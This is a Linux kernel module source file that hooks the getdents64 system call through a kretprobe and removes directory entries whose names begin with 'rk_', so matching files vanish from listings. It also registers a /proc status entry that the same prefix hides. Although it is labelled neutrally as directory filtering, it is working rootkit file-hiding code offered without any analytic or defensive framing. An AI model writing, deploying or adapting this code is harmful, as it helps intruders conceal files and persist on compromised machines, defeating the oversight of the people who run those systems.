// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define HIDDEN_PREFIX "rk_"

static struct proc_dir_entry *proc_entry;

struct getdents_ctx {
	struct linux_dirent64 __user *dirent;
};

static bool valid_dirents(const char *buffer, long length)
{
	long offset = 0;
	const size_t header = offsetof(struct linux_dirent64, d_name) + 1;

	while (offset < length) {
		const struct linux_dirent64 *entry =
			(const void *)(buffer + offset);
		size_t remaining = length - offset;

		if (remaining < header || entry->d_reclen < header ||
		    entry->d_reclen > remaining ||
		    !memchr(entry->d_name, '\0', entry->d_reclen -
						 offsetof(struct linux_dirent64, d_name)))
			return false;
		offset += entry->d_reclen;
	}
	return offset == length;
}

static int entry_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	struct pt_regs *uregs = (struct pt_regs *)regs->di;

	ctx->dirent = (struct linux_dirent64 __user *)uregs->si;
	return 0;
}

static int ret_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	long ret = regs_return_value(regs);
	struct linux_dirent64 *cur;
	char *buf;
	long off;

	if (ret <= 0)
		return 0;

	buf = kmalloc(ret, GFP_ATOMIC);
	if (!buf)
		return 0;

	if (copy_from_user_nofault(buf, ctx->dirent, ret)) {
		kfree(buf);
		return 0;
	}
	if (!valid_dirents(buf, ret)) {
		kfree(buf);
		return 0;
	}

	off = 0;
	while (off < ret) {
		cur = (struct linux_dirent64 *)(buf + off);
		if (strncmp(cur->d_name, HIDDEN_PREFIX,
			    sizeof(HIDDEN_PREFIX) - 1) == 0) {
			long rest = ret - off - cur->d_reclen;

			if (rest > 0)
				memmove(buf + off, buf + off + cur->d_reclen,
					rest);
			ret -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}

	if (!copy_to_user_nofault(ctx->dirent, buf, ret))
		regs_set_return_value(regs, ret);
	kfree(buf);
	return 0;
}

static struct kretprobe krp = {
	.kp.symbol_name = "__x64_sys_getdents64",
	.entry_handler = entry_getdents64,
	.handler = ret_getdents64,
	.data_size = sizeof(struct getdents_ctx),
};

static int status_show(struct seq_file *m, void *v)
{
	seq_puts(m, "hidden\n");
	return 0;
}

static int __init dirfilter_init(void)
{
	int err;

	err = register_kretprobe(&krp);
	if (err)
		return err;

	proc_entry =
	    proc_create_single("rk_dirfilter", 0444, NULL, status_show);
	if (!proc_entry) {
		unregister_kretprobe(&krp);
		return -ENOMEM;
	}

	pr_info("rk: getdents64 hook installed\n");
	return 0;
}

static void __exit dirfilter_exit(void)
{
	proc_remove(proc_entry);
	unregister_kretprobe(&krp);
}

module_init(dirfilter_init);
module_exit(dirfilter_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Directory entry filtering via getdents64");
